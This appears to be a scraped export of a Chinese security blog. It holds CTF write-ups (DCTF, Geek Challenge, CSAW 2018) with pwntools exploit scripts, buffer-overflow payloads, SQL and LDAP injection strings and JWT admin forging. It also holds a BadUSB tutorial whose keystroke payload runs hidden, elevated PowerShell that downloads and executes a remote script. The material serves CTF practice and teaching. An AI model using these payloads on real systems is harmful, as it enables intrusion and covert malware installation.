这样来输出一百个伪随机数字12045728160,999757742,1103458615,457950600,1444241668,459281054,1543513065,1546750049,178068626,1337501091,1398490315,632882557,316733390,627129835,375653904,1151751726,132249441,1178832412,1784493309,36098333,1808153066,1840701539,495212499,111955712,1895620395,1941274903,495499453,177285689,7383240,596865193,1837829365,2053111400,1596622935,793804332,363578353,893380956,1253085387,1907091418,292647357,1431154013,1097108861,1691137672,2064036570,1413842252,170783860,292206826,418110330,303033301,1471039239,55119991,339131634,1131708657,1895821530,834344133,1243664369,1643958278,628135388,1739163822,1821243967,635518628,188545368,1511589684,541146381,1785168303,157910369,904724734,531065611,1410995756,664332504,823712968,694666121,1761441365,367366993,611219043,1027799969,538150853,903425870,1445910299,841184154,226981461,1501030291,1180315788,1358690118,1249368173,2014659921,454870840,745842803,495311661,46551014,419603122,1130830289,235096382,1931192807,1671976670,2020264686,2089103176,429217756,403846649,1352615284,1093550260 wp.py12345678910111213141516#!/usr/bin/env pythonfrom pwn import * numbers = [2045728160,999757742,1103458615,457950600,1444241668,459281054,1543513065,1546750049,178068626,1337501091,1398490315,632882557,316733390,627129835,375653904,1151751726,132249441,1178832412,1784493309,36098333,1808153066,1840701539,495212499,111955712,1895620395,1941274903,495499453,177285689,7383240,596865193,1837829365,2053111400,1596622935,793804332,363578353,893380956,1253085387,1907091418,292647357,1431154013,1097108861,1691137672,2064036570,1413842252,170783860,292206826,418110330,303033301,1471039239,55119991,339131634,1131708657,1895821530,834344133,1243664369,1643958278,628135388,1739163822,1821243967,635518628,188545368,1511589684,541146381,1785168303,157910369,904724734,531065611,1410995756,664332504,823712968,694666121,1761441365,367366993,611219043,1027799969,538150853,903425870,1445910299,841184154,226981461,1501030291,1180315788,1358690118,1249368173,2014659921,454870840,745842803,495311661,46551014,419603122,1130830289,235096382,1931192807,1671976670,2020264686,2089103176,429217756,403846649,1352615284,1093550260] #刚才生成的数字r = remote('167.99.143.206', 65031)r.recvlines(3)r.sendline('A' * 700 + p32(0x41414141))#保证和之前生成数字时的种子一致r.recvlines(3) for number in numbers: r.recvline() r.sendline(str(number)) r.recvlines(2) print r.recv() 这样我们及控制种子，１００个数字也输对了，flag就get到了DCTF{8adadb46b599a58344559e009bc167da7f0e65e64167c27d3192e8b6df073eaa}430111200008287946","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"BadUSB初探","slug":"HID","date":"2018-11-02T05:32:13.000Z","updated":"2018-11-11T10:13:09.471Z","comments":true,"path":"2018/11/02/HID/","link":"","permalink":"https://threst.github.io/2018/11/02/HID/","excerpt":"","text":"Teensy USB开发板Teensy是一个非常小的完整的基于USB接口的单片机开发系统，能够实现多种类型的项目。所有的编程是通过USB端口。在没有特殊的程序要求下，只有一个标准的Mini-B USB电缆和PC或Macintosh电脑的USB端口。 主要特点： 可以是任何类型设备的USB AVR处理器，16 MHz 单个按键编程 易于使用的Teensy Loader应用程序 免费软件开发工具 兼容Mac OS X，Linux和Windows 小尺寸,许多项目的完美支持 使用标签面包板 非常低的成本 所需工具： 1.Teensy ++ 2.0 2.Teensyduino插件v1.44 3.arduino v1.8.7 arduino下载Teensyduino插件下载地址Teensy Loader 1.Arduino软件不支持Teensy，因此您必须运行Teensyduino安装程序 才能将Teensy文件添加到Arduino软件中。 2.如果您使用的是Linux，则 必须将49-teensy.rules文件复制到/etc/udev/rules.d/，以便非root用户访问Teensy USB设备 3.板子正常编译的时候会弹出teensy的窗口，按下板子上面的按钮，等下teensy就会识别出插入的是什么型号的板子.只有识别出才可以上传代码。 注意:arduino选teensy++2.0板子，usb type 类型选第二个,要不提示Keyboard变量不存在 Kautilya安装123456git clone https://github.com/samratashok/Kautilya &amp;&amp; cd Kautilyabundle installruby kautilya.rbUpdates:git pull origin master keyboard语法盘功能使32u4或SAMD微型板能够通过微型原生USB端口向连接的计算机发送击键。注意：并非所有可能的ASCII字符，特别是非打印字符，都可以通过键盘库发送。 Keyboard.print()和Keyboard.println()都是屏幕输出，后者换行输出Keyboard.press()功能就像按下键并按住键盘一样Keyboard.release()释放键盘,和press向对应Keyboard.write()向所连接的计算机发送击键。这类似于按下和释放键盘上的键。您可以发送一些ASCII字符或其他键盘修饰符和特殊键。 12345678910111213141516171819202122232425262728293031按键 键码 按键 键码 按键 键码 按键 键码A 65 J 74 S 83 1 49B 66 K 75 T 84 2 50C 67 L 76 U 85 3 51D 68 M 77 V 86 4 52E 69 N 78 W 87 5 53F 70 O 79 X 88 6 54G 71 P 80 Y 89 7 55H 72 Q 81 Z 90 8 56I 73 R 82 0 48 9 57按键 键码 按键 键码 按键 键码 按键 键码0 96 8 104 F1 112 F7 1181 97 9 105 F2 113 F8 1192 98 * 106 F3 114 F9 1203 99 + 107 F4 115 F10 1214 100 Enter 108 F5 116 F11 1225 101 - 109 F6 117 F12 1236 102 . 110 7 103 / 111按键 键码 按键 键码 按键 键码 按键 键码BackSpace 8 Esc 27 Right Arrow 39 -_ 189Tab 9 Spacebar 32 Down Arrow 40 .&gt; 190Clear 12 Page Up 33 Insert 45 /? 191Enter 13 Page Down 34 Delete 46 `~ 192Shift 16 End 35 Num Lock 144 [&#123; 219Control 17 Home 36 ;: 186 /| 220Alt 18 Left Arrow 37 =+ 187 ]&#125; 221Cape Lock 20 Up A payload编写全屏装逼1Keyboard.println(\"START-PROCESS -fILEpATH POWERSHELL \\\" -NOP -W HIDDEN -C SET-eXECUTIONpOLICY rEMOTEsIGNED -FORCE;CD $ENV:PUBLIC;(nEW-oBJECT sYSTEM.nET.wEBcLIENT).dOWNLOADfILE(\\'HTTP://image.3001.net/images/20160411/14603516445510.jpg\\',\\'C:\\\\USERS\\\\PUBLIC\\\\GET.PS1\\');./GET.PS1;EXIT\\\" -vERB RUNAS;EXIT\"); START-PROCESS你可以指定浏览器和带上URL参数 文章 实战Teensy烧录渗透测试U盘 Teensy HID 攻击工具 Kautilya 的改进与稳定利用分析 Teensy ++ 2.0和MetasploitTeensy ++ 2.0 Metasploit第2部分Teensy ++ 2.0 Metasploit第3部分BadUSB —— Teensy++2.0关于HID攻击介绍Teensy之简单代码编写利用Arduino快速制作Teensy BadUSB使用TeensyLoader PayloadKautilyaBrutalteensyhttps://github.com/Ozuru/Paensy/tree/master/Payloads","categories":[],"tags":[{"name":"BadUSB","slug":"BadUSB","permalink":"https://threst.github.io/tags/BadUSB/"}]},{"title":"parrot安装","slug":"install","date":"2018-10-16T05:32:13.000Z","updated":"2018-11-11T10:12:23.667Z","comments":true,"path":"2018/10/16/install/","link":"","permalink":"https://threst.github.io/2018/10/16/install/","excerpt":"","text":"下载系统网站:https://www.parrotsec.org/download.php 镜像制作:Etcherhttps://etcher.io/ 支持3平台，很好用 更新系统换源sudo vim /etc/apt/sources.list.d/parrot.list添加清华源deb http://mirrors.tuna.tsinghua.edu.cn/parrot/ parrot main contrib non-free 更新 apt-get updateapt-get dist-upgrade 安装搜狗输入法安装fcitxsudo apt-get install fcitx 安装fcitx-libs-qtsudo apt-get install fcitx-libs-qt 下载对应版本deb去搜狗输入法官网http://pinyin.sogou.com/linux/ 下载自己系统对应版本的输入法安装包。 sudo apt-get -f install sudo dpkg -i sogoupinyin_2.2.0.0108_amd64.deb 然后在fictx配置中中设置搜狗为第二个，这样首先的输入为英语，重启电脑","categories":[],"tags":[{"name":"系统","slug":"系统","permalink":"https://threst.github.io/tags/系统/"}]},{"title":"极客大挑战wp","slug":"极客大挑战","date":"2018-10-14T05:32:13.000Z","updated":"2018-11-11T10:10:57.639Z","comments":true,"path":"2018/10/14/极客大挑战/","link":"","permalink":"https://threst.github.io/2018/10/14/极客大挑战/","excerpt":"","text":"初来乍到查看源码 flag: SYC{View_Page_Source_to_Get_Flag} 代号为geek的行动第二幕：废弃的地下黑客论坛登录框,放到sqlmap上面跑了下，没有注入，可是根据The sql you execute in final :select * from users where username=&#39;admin&#39;&quot;&quot;&#39; and password=&#39;admi 判断可能是王能密码，尝试username=admin&#39; or 1=1-- -&amp;password=admin 结果提示hack!!! The length of username and password should not exceed 15. 参考https://www.secpulse.com/archives/76200.html这篇文章,提交username=xx&#39;=&#39;&amp;password=xx&#39;=&#39; flag:SYC{h4ck-by-l0c4l6uy-23333333333} 萌萌的血小板 下载gif文件，binwalk分析有个rar，修改后缀名为rar，解压,得到一个flag.txt和一个与佛论禅 的提示. flag.txt哆真阿怯菩諦勝缽室不俱悉孕怯豆皤爍缽槃缽舍竟奢迦竟姪俱伊藐俱多蘇罰苦侄帝諳寫缽寫夷若侄菩羯逝除薩伽豆提呐上罰謹俱尼缽地能冥無恐遠咒薩不姪所 http://www.keyfc.net/bbs/tools/tudoucode.aspx到这个网站在线解密下flag:SYC{F1ag_1Ssss_th1s!!!} 小帅圆圆的发际线，你也想要么？ 直接foremost分离rar文件，里面有个666.jpg，strings一下,得到这个字符串 123456789+++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +.+++ +++.&lt; ++++[ -&gt;--- -&lt;]&gt;- ----- .&lt;+++++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++++. &lt;++++ [-&gt;-- --&lt;]&gt; ---.. ....- ----- ---.&lt;+++++ [-&gt;-- ---&lt;] &gt;---- ..... .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;++++[- &gt;---- &lt;]&gt;-. +++++ +++.+ ++++. ----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ +++....&lt;++ ++[-&gt; ----&lt; ]&gt;--. +++++ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .&lt;+++ ++[-&gt; +++++&lt;]&gt;+. &lt;++++ ++++[ -&gt;--- ----- &lt;]&gt;-- ----- --.&lt;+ +++++ ++[-&gt; +++++ +++&lt;]&gt;++++ +.&lt;++ ++[-&gt; ----&lt; ]&gt;--- ---.. +++++ +++.+ +++++ ++.++ +++.&lt; ++++[-&gt;--- -&lt;]&gt;- ----. &lt;+++[ -&gt;+++ &lt;]&gt;+. &lt;+++[ -&gt;+++ &lt;]&gt;++ .&lt;+++ +++++ +[-&gt;------ ---&lt;] &gt;--.&lt; +++++ ++++[ -&gt;+++ +++++ +&lt;]&gt;+ +++++ +++++ .&lt; 解密http://esoteric.sange.fi/brainfuck/impl/interp/i.html flag:SYC{hhhhhh_BBBBBBrainfuuuuck_y0u__got_it!} 幸运大挑战他有一个计时器，必须要10.00才有flag，人手点是不可能的，仔细看发的包 计时器的数字直接显示在url中，直接修改即刻 flag:SYC{evoA_U_are_V3ry_FanTaStic_2_G3t_l0!} 一起来和php撸猫啊12345678910111213141516171819202122232425262728if (isset($_GET['p1']))&#123; if ($_GET['p1'] &gt; 99999999 &amp;&amp; strlen($_GET['p1']) &lt; 9)&#123; if (isset ( $_GET ['p2'] )) &#123; $p2 = $_GET ['p2']; if (is_numeric($p2))&#123; die('Input cannot be a number!!!'); &#125; else&#123; switch ($p2) &#123; case 0 : break; case 1 : break; case 2 : echo \"flag&#123;xxxxx&#125;\"; break; default : echo \"2333333\"; break; &#125; &#125; &#125; &#125; &#125; 审计一波，基本要判断要绕过($_GET[&#39;p1&#39;] &gt; 99999999 &amp;&amp; strlen($_GET[&#39;p1&#39;]) &lt; 9)，这个直接使用数组来绕，然后p2要是2但不能是数字，在数字后面加上字母即刻绕过了,可以参考这篇文章http://www.hackblog.cn/post/72.html test.php?num=8 在 8 后面加任何除数字之外的字母或者符号即可绕过。比如 test.php?num=8a，甚至test.php?num=8%20，加一个空格就可以绕过 payload:http://babycat.game.sycsec.com/?p1=10e9&amp;p2=2a flag:SYC{pHP_1s_th3_most_p0werfu11} 暗网追击打开提示没有权限，抓包直接修改 打开链接http://admin.game.sycsec.com/caveira-pixel-cores_main-article_f4lg.jpg SYC{w3lc0m3-4dm1n} 陈师傅线代考了满分？题目:1234567在陈师傅的线代书上发现了一个奇怪的矩阵，旁边还写着：希尔密码 (1, 2, 1, 2, 1) (1, 1, 1, 2, 1) (2, 2, 1, 2, 1)(2, 1, 2, 3, 1) (2, 1, 1, 2, 2) 下面一个奇怪的字符串:EGWYQ，你能猜到陈师傅加密了什么吗？ flag格式:SYC&#123;你解密的内容&#125; hill密码，首先要算出逆矩阵，在线：http://www.yunsuanzi.com/matrixcomputations/solvematrixinverse.html 直接上脚本 123456789101112131415161718192021222324252627282930313233343536# coding:UTF-8import numpy as npcip = \"egwyq\"#密文key = [[-1,-0,1,0,0],[1,-1,0,-0,-0],[3,-5,-2,2,1],[-2,4,1,-1,-1],[1,-1,-1,-0,1]]#上面的逆矩阵#秘钥逆矩阵的行数hang_len = len(key)#取下标值def pla_index(strs): result = [] for i in strs: result.append(ord(i)-97) return result#将密文根据秘钥逆矩阵长度分组，取下标，存入列表cip_group = []for i in range(0,len(cip),hang_len): a = \"\" a = cip[i:i+hang_len] cip_group.append(list(pla_index(a))) #矩阵相乘，结果存入result中，是一个二维数组result = []for i in cip_group: result.append(list(np.dot(key,i) % 26)) #遍历result，转成明文pla = \"\"for i in result: for j in i: pla += chr(j + 97)print \"解密后的结果为：\"print pla 解密得到sycys,提交的时候要大写!! flag:SYC{SYCYS} 可能没有你想的那么难什么工具不重要，做得出来最重要https://pan.baidu.com/s/1SAdcLshlihkIZ1vZrOG_4Q 提取码: v1wy 下载exe文件，直接strings flag:SYC{y0u_kNow_lt_easy} geek番外篇之废弃的地下黑客论坛和之前呢个登录差不多，payload:username=\\&amp;password=|0#\\或者username=\\&amp;password=&amp;1#\\\\转义单引号,后面我也不知道，可能是保证值为真就行吧 flag:SYC{yun-we1-ya0-be1-gu0} 代号为geek的行动第四幕：绝密情报点开连接给了源码，代码审计 1234567891011121314151617181920212223242526272829 &lt;?phperror_reporting(0);if (!empty($_GET)||!empty($_POST))&#123; if(preg_match(\"syclover\",$_GET['id'])) &#123; echo(\"&lt;p&gt;you're a gay, not allowed !&lt;/p&gt;\"); exit(); &#125; $_GET['id'] = urldecode($_GET['id']); if($_GET['id'] == \"syclover\") &#123; echo \"&lt;p&gt;Wow~ ,You're smart, Access granted!&lt;/p&gt;\"; $f = $_POST[file]; $str = $f.\".php\"; @require $str; &#125; else &#123; @require('showpass.php'); &#125;&#125; else &#123; highlight_file(\"index.php\");&#125;?&gt; flag:SYC{LF1_S0_E@sy_I_L0ve_Sec} 无题蒙师傅说这是他抓智能设备的通信的数据包，说不用题目描述了，直接放tip：flag就在数据包里，明显的不能在明显了。所以.。。提交flag的时候，请把flag四个字母改成SYC再提交！题目链接：https://pan.baidu.com/s/1SJmjEs7WaGaT3S3cgRrxAQ提取码：ejvo 下载一个流量包，基本查看下 保存分组字节为一个压缩包 直接使用foremost来分离，得到一个flag文件 flag:SYC{4f90b47d-86c0-4b0e-8090-cf2eb05f15bc}","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://threst.github.io/tags/ctf/"}]},{"title":"csaw 2018 wp","slug":"csaw2018wp","date":"2018-10-04T05:34:14.000Z","updated":"2018-10-04T07:21:38.193Z","comments":true,"path":"2018/10/04/csaw2018wp/","link":"","permalink":"https://threst.github.io/2018/10/04/csaw2018wp/","excerpt":"","text":"首发安全脉搏:https://www.secpulse.com/archives/75785.html cryptobabycrypto题目123456yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeetsingle yeet yeeted with single yeet == 0yeeetwhat is yeet?yeet is yeetYeetdate: yeeted yeet at yeet: 9:42 pm 提示single yeet yeeted with single yeet == 0想到a XOR a == 0,可能是单字的xor加密 ciphertext 1s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg== 首先要将密文base64解码，再进行xor运算,脚本如下12345678910from pwn import *from base64 import b64decodeciphertext = b64decode(\"s5qQkd+WjN+e34+NkJiNnpKSmo3fiJeQ356Mj5aNmozfi5DfnI2anoua34+NkJiNnpKM34uXnovfl5qTj9+PmpCPk5rfm5Dfk5qMjNHft5rfiJ6Ri4zfi5Dfj4qL356Ki5CSnouWkJHfmZaNjIvT356Rm9+MnJ6Tnp2Wk5aLht+ek5CRmIyWm5rR37ea35uNmp6SjN+Qmd+e34iQjZOb34iXmo2a34uXmt+akZuTmoyM356Rm9+Ll5rflpGZlpGWi5rfnZqckJKa342anpOWi5aajN+LkN+SnpGUlpGb09+ekZvfiJeajZrfi5ea34uNiprfiZ6TiprfkJnfk5aZmt+WjN+PjZqMmo2JmpvRmZOemISblpmZlprSl5qTk5KekdKYz4+XzI2FjZ6wps61npPLnLeeuabGrKithr6uyZ63gg==\")for key in range(256): plaintext = xor(key, ciphertext) if \"flag&#123;\" in plaintext: print plaintext flag:flag{diffie-hellman-g0ph3rzraOY1Jal4cHaFY9SWRyAQ6aH} flatcrypt题目12345no logos or branding for this bugTake your pick nc crypto.chal.csaw.io 8040 nc crypto.chal.csaw.io 8041 nc crypto.chal.csaw.io 8042 nc crypto.chal.csaw.io 8043flag is not in flag format. flag is PROBLEM_KEY serv-distribute.py1234567891011121314151617181920import zlibimport osfrom Crypto.Cipher import AESfrom Crypto.Util import CounterENCRYPT_KEY = bytes.fromhex('0000000000000000000000000000000000000000000000000000000000000000')# Determine this key.# Character set: lowercase letters and underscorePROBLEM_KEY = 'not_the_flag'def encrypt(data, ctr): return AES.new(ENCRYPT_KEY, AES.MODE_CTR, counter=ctr).encrypt(zlib.compress(data))while True: f = input(\"Encrypting service\\n\") if len(f) &lt; 20: continue enc = encrypt(bytes((PROBLEM_KEY + f).encode('utf-8')), Counter.new(64, prefix=os.urandom(8))) print(\"%s%s\" %(enc, chr(len(enc)))) pwnbigboy题目nc pwn.chal.csaw.io 9000 无论输入什么都只打印一个时间就退出了,拖进ida看看 我们要将程序将跳转到调用系统的函数才可以。 修改eax的值 nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\\xee\\xba\\xf3\\xca&#39;&quot;) 看看有些什么 nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\\xee\\xba\\xf3\\xcals&#39;&quot;) 有个flag.txt nc pwn.chal.csaw.io 9000 &lt;&lt;&lt; $(python -c &quot;print &#39;aaaaaaaaaaaaaaaaaaaa\\xee\\xba\\xf3\\xcacat flag.txt&#39;&quot;) flag:flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis} get it?题目12Do you get it?nc pwn.chal.csaw.io 9001 无论输入什么都会重复你输入的然后退出。 objdump -d get_it 123456789101112131415161718192021222324252600000000004005b6 &lt;give_shell&gt;: 4005b6: 55 push %rbp 4005b7: 48 89 e5 mov %rsp,%rbp 4005ba: bf 84 06 40 00 mov $0x400684,%edi 4005bf: e8 bc fe ff ff callq 400480 &lt;system@plt&gt; 4005c4: 90 nop 4005c5: 5d pop %rbp 4005c6: c3 retq 00000000004005c7 &lt;main&gt;: 4005c7: 55 push %rbp 4005c8: 48 89 e5 mov %rsp,%rbp 4005cb: 48 83 ec 30 sub $0x30,%rsp 4005cf: 89 7d dc mov %edi,-0x24(%rbp) 4005d2: 48 89 75 d0 mov %rsi,-0x30(%rbp) 4005d6: bf 8e 06 40 00 mov $0x40068e,%edi 4005db: e8 90 fe ff ff callq 400470 &lt;puts@plt&gt; 4005e0: 48 8d 45 e0 lea -0x20(%rbp),%rax 4005e4: 48 89 c7 mov %rax,%rdi 4005e7: b8 00 00 00 00 mov $0x0,%eax 4005ec: e8 af fe ff ff callq 4004a0 &lt;gets@plt&gt; 4005f1: b8 00 00 00 00 mov $0x0,%eax 4005f6: c9 leaveq 4005f7: c3 retq 4005f8: 0f 1f 84 00 00 00 00 nopl 0x0(%rax,%rax,1) 4005ff: 00 注意这两个函数,main中gets非常可疑,再查看下give_shell函数0x400684 12(gdb) x/s 0x4006840x400684: &quot;/bin/bash&quot; 这是要调用system(&quot;/bin/bash&quot;);搞事啊！！！那就来一波ida F5 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+10h] [rbp-20h] puts(&quot;Do you gets it??&quot;); gets(&amp;v4); return 0;&#125;int give_shell()&#123; return system(&quot;/bin/bash&quot;);&#125; gets(char * s)接受一个参数，它将写入的内存中的位置，然后它将写入你输入的所有字符,lea指令只是做了一些数学运算。在这里表示rax = rbp - 0x20,顺便说一句，0x20 = 32,我们用A来填充获取的局部变量缓冲区。 123456789101112(gdb) break *0x00000000004005f6Breakpoint 1 at 0x4005f6(gdb) runStarting program: /get_it Do you gets it??AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABreakpoint 1, 0x00000000004005f6 in main ()(gdb) x/6xg $rbp - 0x200x7fffffffde90: 0x4141414141414141 0x41414141414141410x7fffffffdea0: 0x4141414141414141 0x41414141414141410x7fffffffdeb0: 0x0000000000400600 0x00007ffff7e11b17 测试一下python -c &quot;print &#39;A&#39; * 32 + &#39;B&#39;*8 + &#39;\\xb6\\x05@\\x00\\x00\\x00\\x00\\x00&#39;&quot; &gt; test 12345678910111213(gdb) run &lt; testStarting program: /get_it &lt; testDo you gets it??Breakpoint 1, 0x00000000004005f6 in main ()(gdb) x/6xg $rbp - 0x200x7fffffffde90: 0x4141414141414141 0x41414141414141410x7fffffffdea0: 0x4141414141414141 0x41414141414141410x7fffffffdeb0: 0x4242424242424242 0x00000000004005b6(gdb) nexti0x00000000004005f7 in main ()(gdb) nexti0x00000000004005b6 in give_shell () ok,进入give_shell flag:flag{y0u_deF_get_itls} miscShort Circuit题目123Start from the monkey&apos;s paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.Elyk 下载图片下来 这个就是很多个LED灯连在一起，分析一下，连了地线的表示&quot;1&quot;,其他表示&quot;0&quot;, 最后表示1201100110 01101100 01100001 01100111 01111011 01101111 01110111 01101101 0111100101101000 01100001 01101110 01100100 01111101 flag:flag{owmyhand} Algebra题目123Are you a real math wiz?nc misc.chal.csaw.io 9002 就是根据他的等式来接X,题目会越来越难,写个脚本就可以解开 12345678910111213141516from pwn import *from re import *r = remote(\"misc.chal.csaw.io\", 9002)r.recvuntil(\"*********\")r.recvline()while True: task = r.recvline() print task print r.recvuntil(\"What does X equal?: \") eq1 = task.replace(\"=\",\"-(\")+\")\" c = eval(eq1,&#123;\"X\":1j&#125;) result = 0 if c.imag != 0: result = -c.real/c.imag r.sendline(str(result)) print r.recvline() flag:flag{y0u_s0_60od_aT_tH3_qU1cK_M4tH5} Take an L题目123Fill the grid with L&apos;s but avoid the marked spot for the Wnc misc.chal.csaw.io 9000The origin is at (0,0) on the top left 通过google,发现了这个 使用的算法是recursiv,我们在网格的中间放置一个“L”（L-tromino），然后我们将网格分割成子网格，并为每个子网格执行相同的过程。当网格与我们的“L”（2 * 2）大小相同时，递归函数停止。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980# -*- coding:utf-8 -*-from pwn import * HOST = \"misc.chal.csaw.io\"PORT = 9000r = remote(HOST, PORT)def send(c): print(c) r.sendline(c)rec = r.recvuntil(\"marked block: \")print(rec)black = eval(r.recvuntil(\"\\n\").strip())print(\"Black cell: \"+str(black))n = 64 a = [[' ' for x in range(n)] for y in range(n)] a[black[1]][black[0]] = \"@\" def pgrille(): out = \"\" out += \"-\"*n out += \"\\n\" for l in a: out += str(''.join([x for x in l]))+\"\\n\" out += \"-\"*n with open(\"logs\",\"a+\") as fi: fi.write(out+\"\\n\\n\\n\")def getBlack(a,x_start,y_start,x_end,y_end): for j in range(y_start,y_end+1): for i in range(x_start,x_end+1): if a[j][i] == \"o\" or a[j][i] == \"@\": return i,j return None,None def Tile(a,x_start,y_start,x_end,y_end): xcenter_left = x_start+((x_end-x_start)/2) xcenter_right = xcenter_left+1 ycenter_top = y_start+((y_end-y_start)/2) ycenter_bottom = ycenter_top+1 xBlack,yBlack = getBlack(a,x_start,y_start,x_end,y_end) if xBlack &lt;= xcenter_left: if yBlack &lt;= ycenter_top: a[ycenter_top][xcenter_right] = \"o\" a[ycenter_bottom][xcenter_right] = \"o\" a[ycenter_bottom][xcenter_left] = \"o\" send(\"(\"+str(xcenter_right)+\",\"+str(ycenter_top)+\"),(\"+str(xcenter_right)+\",\"+str(ycenter_bottom)+\"),(\"+str(xcenter_left)+\",\"+str(ycenter_bottom)+\")\") else: a[ycenter_top][xcenter_left] = \"o\" a[ycenter_top][xcenter_right] = \"o\" a[ycenter_bottom][xcenter_right] = \"o\" send(\"(\"+str(xcenter_left)+\",\"+str(ycenter_top)+\"),(\"+str(xcenter_right)+\",\"+str(ycenter_top)+\"),(\"+str(xcenter_right)+\",\"+str(ycenter_bottom)+\")\") else: if yBlack &lt;= ycenter_top: a[ycenter_top][xcenter_left] = \"o\" a[ycenter_bottom][xcenter_left] = \"o\" a[ycenter_bottom][xcenter_right] = \"o\" send(\"(\"+str(xcenter_left)+\",\"+str(ycenter_top)+\"),(\"+str(xcenter_left)+\",\"+str(ycenter_bottom)+\"),(\"+str(xcenter_right)+\",\"+str(ycenter_bottom)+\")\") else: a[ycenter_bottom][xcenter_left] = \"o\" a[ycenter_top][xcenter_left] = \"o\" a[ycenter_top][xcenter_right] = \"o\" send(\"(\"+str(xcenter_left)+\",\"+str(ycenter_bottom)+\"),(\"+str(xcenter_left)+\",\"+str(ycenter_top)+\"),(\"+str(xcenter_right)+\",\"+str(ycenter_top)+\")\") pgrille() if abs(x_end-x_start) &gt; 1: Tile(a,x_start,y_start,xcenter_left,ycenter_top) Tile(a,xcenter_right,y_start,x_end,ycenter_top) Tile(a,x_start,ycenter_bottom,xcenter_left,y_end) Tile(a,xcenter_right,ycenter_bottom,x_end,y_end) Tile(a,0,0,len(a[0])-1,len(a)-1) r.interactive() 参考大佬代码 flag:flag{m@n_that_was_sup3r_hard_i_sh0uld_have_just_taken_the_L} webLdab题目12dabhttp://web.chal.csaw.io:8080 一个简单的LDAP注入 payload:http://web.chal.csaw.io:8080/index.php/index.php?search=*)(uid=*))(|(uid=* flag:flag{ld4p_inj3ction_i5_a_th1ng} sso题目1234Be the admin you were always meant to behttp://web.chal.csaw.io:9000Update chal description at: 4:38 to include solve detailsAesthetic update for chal at Sun 7:25 AM 首先查看源码123456&lt;h1&gt;Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!&lt;/h1&gt;&lt;a href=\"/protected\"&gt;.&lt;/a&gt;&lt;!--Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guessPOST /oauth2/tokenPOST /oauth2/authorize form-data TODO: make a form for this route--!&gt; 根据判断应该是基于OAuth2.0协议的身份验证,不了解的童鞋可以看看这篇文章https://tools.ietf.org/html/rfc6749https://tools.ietf.org/html/rfc6750https://blog.csdn.net/cd_xuyue/article/details/52084220 首先我要获取一个code，用burp抓包http://web.chal.csaw.io:9000/protected 在/oauth2/authorize中response_type必须要填，而且为code，redirect_uri将传递给重定向端点的绝对URI 我们将返回一个code,我们再次修改数据包发送Access Token Request code的参数就是刚才返回的code值，这样我们将得到一个token，这个要使用jwt解码才能看见里面的内容, jwt解码网站https://jwt.io/ 根据题目提示，我们要将type改成admin才可以 参考大佬的加密脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#!/usr/bin/env python3# -*- coding: utf8 -*-import base64import timeimport hashlibimport hmacimport jsonimport sysfrom collections import OrderedDictdef dump_tokens(jwt): p1, p2, p3 = jwt.split('.', 3) header = decode_token(p1) payload = decode_token(p2) return header, payloaddef decode_token(token): token_len = len(token) padded_token = token.ljust(token_len + (token_len % 4), '=') dict_ = json.loads(base64.b64decode(padded_token), object_pairs_hook=OrderedDict) return dict_def base64_encode(data): return base64.b64encode(data).decode().strip('=')def encode_token(dict_): json_data = json.dumps(dict_, separators=(',', ':')).encode() token = base64_encode(json_data) return tokendef sign_token(header, payload, secret): jwt = encode_token(header) + '.' # header jwt += encode_token(payload) + '.' # payload signature = base64_encode(hmac.new(secret.encode(), jwt[:-1].encode(), hashlib.sha256).digest()) signature = signature.replace('/', '_').replace('+', '-') jwt += signature return jwtif len(sys.argv) &lt; 1: print(f'Usage &#123;sys.argv[0]&#125; &lt;jwt&gt;')else: header, payload = dump_tokens(sys.argv[1]) # get original JWT as dict print(f'''Original JWT values: * header: &#123;dict(header)&#125; * payload: &#123;dict(payload)&#125;''') new_header = header new_payload = payload # Update user type new_payload['type'] = 'admin' # Update expiration time unix_ts = int(time.time()) flag_window = 600 new_payload['iat'] = unix_ts new_payload['exp'] = unix_ts + flag_window print(f'''New JWT values: * header: &#123;dict(header)&#125; * payload: &#123;dict(payload)&#125;''') # Generate new JWT (signature) new_jwt = sign_token(header, payload, payload['secret']) print(f'New signed JWT: &#123;new_jwt&#125;') 运行脚本 